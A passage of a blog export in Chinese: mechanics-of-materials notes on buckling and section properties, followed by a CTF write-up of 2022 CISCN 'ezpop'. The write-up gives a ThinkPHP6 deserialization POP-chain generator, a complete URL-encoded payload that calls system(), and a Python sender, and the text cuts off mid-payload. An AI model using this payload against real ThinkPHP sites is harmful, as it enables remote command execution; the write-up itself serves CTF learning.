经验公式\n\n$$\n\\sigma_\\mathrm{cr} = \\frac{F_\\mathrm{cr}}{A} = \\frac{\\pi^2EI}{(\\mu l)^2A}\n$$\n$ \\sigma_\\mathrm{cr}$ 称为临界应力。把横截面的惯性矩 $I$ 写成\n$$\nI = i^2A\n$$\n上式可以写成\n$$\n\\sigma_\\mathrm{cr} = \\frac{\\pi^2E}{(\\frac{\\mu l}{i})^2A}\n$$\n引用记号\n$$\n\\lambda = \\frac{\\mu l}{i}\n$$\n$\\lambda$ 是一个量纲一的量，称为柔度或长细比，综合反映了压杆的长度、约束条件、截面尺寸和形状等因素对临界应力 $\\sigma_\\mathrm{cr}$ 的影响。计算临界应力的公式可以写成\n$$\n\\sigma_\\mathrm{cr} = \\frac{\\pi^2E}{\\lambda^2}\n$$\n这是欧拉公式的另一种表达形式，其适用范围为\n$$\n\\lambda \\leqslant \\lambda_\\mathrm{p} = \\pi\\sqrt{\\frac{E}{\\sigma_\\mathrm{p}}}\n$$\n\n### 压杆的稳定性校核\n\n$F_\\mathrm{cr}$ 与 $F$ 之比即为压杆的工作安全因数 $n$，它应大于规定的稳定安全因数 $n_\\mathrm{st}$，即\n$$\nn = \\frac{F_\\mathrm{cr}}{F} \\geqslant n_\\mathrm{st}\n$$\n\n## 平面图形的几何性质\n\n### 静矩和形心\n\n在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分\n$$\nS_z = \\int_A y\\mathrm{d}A, \\quad S_y = \\int_A z\\mathrm{d}A\n$$\n分别定义为图形对 $z$ 轴和 $y$ 轴的**静矩**，也称为图形对 $z$ 轴和 $y$ 轴的**一次矩**。\n这个坐标轴之所以只有 $y$ 和 $z$ 而没有 $x$ ，是因为我们一般分析的是横截面，$x$ 轴是杆的轴线方向。\n可以看出，平面图形的静矩是对某一坐标轴而言的，也就是说，同一图形对不同的坐标轴的静矩通常是不同的。静矩的量纲是长度的三次方。\n\n平面图形对 $y$ 轴和 $z$ 轴的静矩，分别等于**图形面积** $A$ **乘形心的坐标** $\\overline{z}$ 和 $\\overline{y}$ ，即\n$$\nS_z = A\\cdot\\overline{y}, \\quad S_y = A\\cdot\\overline{z}\n$$\n\n### 惯性矩和惯性半径\n\n在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分\n$$\nI_y = \\int_A z^2\\mathrm{d}A, \\quad I_z = \\int_A y^2\\mathrm{d}A\n$$\n分别定义为图形对 $y$ 轴和 $z$ 轴的**惯性矩**，也称为图形对 $y$ 轴和 $z$ 轴的**二次矩**。惯性矩的量纲是长度的四次方。\n矩形的对形心轴的 $I_z$ 为 $\\frac{bh^3}{12}$ 。\n力学计算中，有时把惯性矩写成图形面积 $A$ 与某一长度的平方的乘积，即\n$$\nI_y = A\\cdot i_y^2, \\quad I_z = A\\cdot i_z^2\n$$\n或者改写为\n$$\ni_y = \\sqrt{\\frac{I_y}{A}}, \\quad i_z = \\sqrt{\\frac{I_z}{A}}\n$$\n式中的 $i_y$ 和 $i_z$ 分别称为图形对 $y$ 轴和 $z$ 轴的**惯性半径**。惯性半径的量纲就是长度的量纲。\n\n以 $\\rho$ 表示微面积 $\\mathrm{d}A$ 到坐标原点 $O$ 的距离，下列积分\n$$\nI_\\mathrm{p} = \\int_A \\rho^2\\mathrm{d}A\n$$\n定义为图形对坐标原点 $O$ 的**极惯性矩**。又 $\\rho^2 = y^2+z^2$ ，于是有\n$$\nI_\\mathrm{p} = \\int_A (y^2+z^2)\\mathrm{d}A = \\int_A y^2\\mathrm{d}A + \\int_A z^2\\mathrm{d}A = I_z + I_y\n$$\n\n### 惯性积\n\n在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分\n$$\nI_{yz} = \\int_A yz\\mathrm{d}A\n$$\n定义为图形对 $y,z$ 轴的**惯性积**。惯性积的量纲是长度的四次方。\n坐标系的两根坐标轴中只要有一根为图形对称轴，则图形对这一坐标系的惯性积就等于零。\n\n### 平行移轴公式\n\n$$\nI_y = I_{yC} + a^2A \\\\\\\\\nI_z = I_{zC} + b^2A \\\\\\\\\n$$\n","slug":"材料力学笔记","published":1,"updated":"2024-05-08T10:26:10.339Z","_id":"cldvq79nx0000g06gdqp76ra0","comments":1,"layout":"post","photos":[]},{"title":"2022 CISCN - ezpop","date":"2024-06-05T07:52:00.000Z","_content":"\n两年前的意难平。\n<!--more-->\n********************************\n\n## 前言\n\n当时 pop 链都找到了，就是打不通，hackbar 和 python 都不行，成了一个疙瘩，正好现在全面转 web 安全了，把这根刺拔了先。\n\n## 题解\n\n最近渗透做多了，看到题目就想扫目录（\n直接访问 `www.zip` 就能把源码下下来，看到 `app/controller/Index.php`\n\n```php\n<?php\nnamespace app\\controller;\n\nuse app\\BaseController;\n\nclass Index extends BaseController\n{\n    public function index()\n    {\n        return '<style type=\"text/css\">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style=\"padding: 24px 48px;\"> <h1>:) </h1><p> ThinkPHP V' . \\think\\facade\\App::version() . '<br/><span style=\"font-size:30px;\">14载初心不改 - 你值得信赖的PHP框架</span></p><span style=\"font-size:25px;\">[ V6.0 版本由 <a href=\"https://www.yisu.com/\" target=\"yisu\">亿速云</a> 独家赞助发布 ]</span></div><script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=64890268\" charset=\"UTF-8\"></script><script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\"></script><think id=\"ee9b1aa918103c4fc\"></think>';\n    }\n\n    public function hello($name = 'ThinkPHP6')\n    {\n        return 'hello,' . $name;\n    }\n    public function test()\n    {\n    unserialize($_POST['a']);\n    }\n    \n}\n```\n\n可知路由为 `Index/test`，用 POST 传进参数 `a`，用这个 [PoC](https://www.freebuf.com/vuls/321546.html) 生成一个 payload，然后用 burp 发包，得到 flag。\n\n```php\n<?php\nnamespace think{\n    abstract class Model{\n        private $lazySave = false;\n        private $data = [];\n        private $exists = false;\n        protected $table;\n        private $withAttr = [];\n        protected $json = [];\n        protected $jsonAssoc = false;\n        function __construct($obj = ''){\n            $this->lazySave = True;\n            $this->data = ['whoami' => ['dir']];\n            $this->exists = True;\n            $this->table = $obj;\n            $this->withAttr = ['whoami' => ['system']];\n            $this->json = ['whoami',['whoami']];\n            $this->jsonAssoc = True;\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\n\nnamespace {\n    echo(base64_encode(serialize(new think\\model\\Pivot(new think\\model\\Pivot()))));\n}\n```\n\npayload 如下：\n\n```plain\nO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D \n```\n\n把 `dir` 换成 `cat /flag` 即可。\n\n现在分析为什么我当初用 python 不行，这是我的 python 代码：\n\n```python\nimport requests\n\nurl = '<url>/Index/test'\n\nheaders = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\"\n}\ndata = {\n    \"a\": r\"O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D\"\n}\n\nres = requests.post(url, data=data, headers=headers)\n\nprint(res.text)\n```\n\n`print(requests.Request('POST', url, data=data, headers=headers).prepare().body)` 查看请求体后发现 payload 长这样了\n\n```plain\na=O%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253BO%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253Bs%253A0%253A%2522%2522%253Bs%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257Ds%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257D\n```\n\n也就是说，它又被 urlencode 了一次，所以应该直接写成如下形式：\n\n```python\ndata = \"a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D \"\n```\n\n## 源码分析\n\n跟进 `requests.Request`，可以看到如下代码：\n\n```python\ndef prepare_body(self, data, files, json=None):\n    \"\"\"Prepares the given HTTP body data.\"\"\"\n\n    # Check if file, fo, generator, iterator.\n    # If not, run through normal process.\n\n    # Nottin' on you.\n    body = None\n    content_type = None\n\n    if not data and json is not None:\n        # urllib3 requires a bytes-like body. Python 2's json.dumps\n        # provides this natively, but Python 3 gives a Unicode string.\n        content_type = \"application/json\"\n\n        try:\n            body = complexjson.dumps(json, allow_nan=False)\n        except ValueError as ve:\n            raise InvalidJSONError(ve, request=self)\n\n        if not isinstance(body, bytes):\n            body = body.encode(\"utf-8\")\n\n    is_stream = all(\n        [\n            hasattr(data, \"__iter__\"),\n            not isinstance(data, (basestring, list, tuple, Mapping)),\n        ]\n    )\n\n    if is_stream:\n        try:\n            length = super_len(data)\n        except (TypeError, AttributeError, UnsupportedOperation):\n            length = None\n\n        body = data\n\n        if getattr(body, \"tell\", None) is not None:\n            # Record the current file position before reading.\n            # This will allow us to rewind a file in the event\n            # of a redirect.\n            try:\n                self._body_position = body.tell()\n            except OSError:\n                # This differentiates from None, allowing us to catch\n                # a failed `tell()` later when trying to rewind the body\n                self._body_position = object()\n\n        if files:\n            raise NotImplementedError(\n                \"Streamed bodies and files are mutually exclusive.\"\n            )\n\n        if length:\n            self.headers[\"Content-Length\"] = builtin_str(length)\n        else:\n            self.headers[\"Transfer-Encoding\"] = \"chunked\"\n    else:\n        # Multi-part file uploads.\n        if files:\n            (body, content_type) = self._encode_files(files, data)\n        else:\n            if data:\n                body = self._encode_params(data)\n                if isinstance(data, basestring) or hasattr(data, \"read\"):\n                    content_type = None\n                else:\n                    content_type = \"application/x-www-form-urlencoded\"\n\n        self.prepare_content_length(body)\n\n        # Add content-type if it wasn't explicitly provided.\n        if content_type and (\"content-type\" not in self.headers):\n            self.headers[\"Content-Type\"] = content_type\n\n    self.body = body\n```\n\n可以看到，`data` 参数会被 `self._encode_params` 处理，再看 `self._encode_params`：\n\n```python\n@staticmethod\ndef _encode_params(data):\n    \"\"\"Encode parameters in a piece of data.\n\n    Will successfully encode parameters when passed as a dict or a list of\n    2-tuples. Order is retained if data is a list of 2-tuples but arbitrary\n    if parameters are supplied as a dict.\n    \"\"\"\n\n    if isinstance(data, (str, bytes)):\n        return data\n    elif hasattr(data, \"read\"):\n        return data\n    elif hasattr(data, \"__iter__\"):\n        result = []\n        for k, vs in to_key_val_list(data):\n            if isinstance(vs, basestring) or not hasattr(vs, \"__iter__\"):\n                vs = [vs]\n            for v in vs:\n                if v is not None:\n                    result.append(\n                        (\n                            k.encode(\"utf-8\") if isinstance(k, str) else k,\n                            v.encode(\"utf-8\") if isinstance(v, str) else v,\n                        )\n                    )\n        return urlencode(result, doseq=True)\n    else:\n        return data\n```\n\n其中\n","source":"_posts/2022 CISCN - ezpop.md","raw":"---\ntitle: 2022 CISCN - ezpop\ndate: 2024-06-05 15:52:00\ntags: [CTF, web]\ncategories: 题解\n---\n\n两年前的意难平。\n<!--more-->\n********************************\n\n## 前言\n\n当时 pop 链都找到了，就是打不通，hackbar 和 python 都不行，成了一个疙瘩，正好现在全面转 web 安全了，把这根刺拔了先。\n\n## 题解\n\n最近渗透做多了，看到题目就想扫目录（\n直接访问 `www.zip` 就能把源码下下来，看到 `app/controller/Index.php`\n\n```php\n<?php\nnamespace app\\controller;\n\nuse app\\BaseController;\n\nclass Index extends BaseController\n{\n    public function index()\n    {\n        return '<style type=\"text/css\">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style=\"padding: 24px 48px;\"> <h1>:) </h1><p> ThinkPHP V' . \\think\\facade\\App::version() . '<br/><span style=\"font-size:30px;\">14载初心不改 - 你值得信赖的PHP框架</span></p><span style=\"font-size:25px;\">[ V6.0 版本由 <a href=\"https://www.yisu.com/\" target=\"yisu\">亿速云</a> 独家赞助发布 ]</span></div><script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=64890268\" charset=\"UTF-8\"></script><script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\"></script><think id=\"ee9b1aa918103c4fc\"></think>';\n    }\n\n    public function hello($name = 'ThinkPHP6')\n    {\n        return 'hello,' . $name;\n    }\n    public function test()\n    {\n    unserialize($_POST['a']);\n    }\n    \n}\n```\n\n可知路由为 `Index/test`，用 POST 传进参数 `a`，用这个 [PoC](https://www.freebuf.com/vuls/321546.html) 生成一个 payload，然后用 burp 发包，得到 flag。\n\n```php\n<?php\nnamespace think{\n    abstract class Model{\n        private $lazySave = false;\n        private $data = [];\n        private $exists = false;\n        protected $table;\n        private $withAttr = [];\n        protected $json = [];\n        protected $jsonAssoc = false;\n        function __construct($obj = ''){\n            $this->lazySave = True;\n            $this->data = ['whoami' => ['dir']];\n            $this->exists = True;\n            $this->table = $obj;\n            $this->withAttr = ['whoami' => ['system']];\n            $this->json = ['whoami',['whoami']];\n            $this->jsonAssoc = True;\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\n\nnamespace {\n    echo(base64_encode(serialize(new think\\model\\Pivot(new think\\model\\Pivot()))));\n}\n```\n\npayload 如下：\n\n```plain\nO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D \n```\n\n把 `dir` 换成 `cat /flag` 即可。\n\n现在分析为什么我当初用 python 不行，这是我的 python 代码：\n\n```python\nimport requests\n\nurl = '<url>/Index/test'\n\nheaders = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\"\n}\ndata = {\n    \"a\": r\"O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D\"\n}\n\nres = requests.post(url, data=data, headers=headers)\n\nprint(res.text)\n```\n\n`print(requests.Request('POST', url, data=data, headers=headers).prepare().body)` 查看请求体后发现 payload 长这样了\n\n```plain\na=O%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253BO%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253Bs%253A0%253A%2522%2522%253Bs%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257Ds%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257D\n```\n\n也就是说，它又被 urlencode 了一次，所以应该直接写成如下形式：\n\n```python\ndata = \"a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3